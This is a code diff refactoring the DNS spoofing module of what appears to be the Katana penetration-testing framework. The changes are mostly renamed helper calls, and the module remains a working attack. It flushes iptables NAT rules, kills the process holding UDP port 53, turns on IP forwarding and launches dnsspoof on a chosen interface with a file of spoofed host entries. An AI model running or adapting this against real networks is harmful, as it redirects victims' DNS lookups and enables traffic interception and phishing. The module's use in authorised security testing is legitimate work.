@@ -3,11 +3,10 @@
 
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Katana Core import                  #
-from core.KATANAFRAMEWORK import *    #
+from core.KatanaFramework import *    #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 
 # LIBRARIES  
-from core.Function import get_gateway,isConect,Subprocess,checkDevice,get_interfaces
 import commands
 # END LIBRARIES  
 
@@ -30,24 +29,25 @@ def init():
 		'hostfile' :["files/test/host" ,True ,'DNS\'s Spoofed File']
 	}
 
-	init.aux =  "\n Devices Founds: """+str(get_interfaces())
-	init.aux += " Functions     : to edit the DNS rules. 'x::nano "+init.options['hostfile'][0]+"'\n"
+	init.aux =  "\n Devices Founds: """+str(NET.GetInterfacesOnSystem())
+	init.aux += "\n Functions     : to edit the DNS rules. 'x::nano "+init.options['hostfile'][0]+"'\n"
 	return init
 # END INFORMATION MODULE
 
 # CODE MODULE    ############################################################################################
 def main(run):
 	
-	if isConect() and checkDevice(init.var['interface']):
+	if NET.AmIConectedToANetwork() and NET.CheckIfExistInterface(init.var['interface']):
+
 		Loadingfile(init.var['hostfile'])
 		open(init.var['hostfile'],'r')
-		printAlert(0,"Starting DNS spoofing [dnsspoof].")
+		printk.inf("Starting DNS spoofing [dnsspoof].")
 		commands.getoutput("iptables --flush -t nat")
 		commands.getoutput("sudo fuser -kuv 53/udp  >/dev/null 2>&1 ")
 		commands.getoutput("echo 1 > /proc/sys/net/ipv4/ip_forward")
-		Subprocess("dnsspoof -i "+init.var['interface']+" -f "+init.var['hostfile'])
-		raw_input(printAlert(8,"to Stop DNS Spoof Attack (PRESS ANY KEY)\n"))
-		commands.getoutput("killall dnsspoof")
+		SYSTEM.Subprocess("dnsspoof -i "+init.var['interface']+" -f "+init.var['hostfile'])
+		raw_input(printk.pkey("if you want to stop DNS Spoof (PRESS [ENTER])\n"))
+		SYSTEM.KillProcess("dnsspoof")
 		commands.getoutput("echo 0 > /proc/sys/net/ipv4/ip_forward")
 		commands.getoutput("iptables --flush -t nat")
 
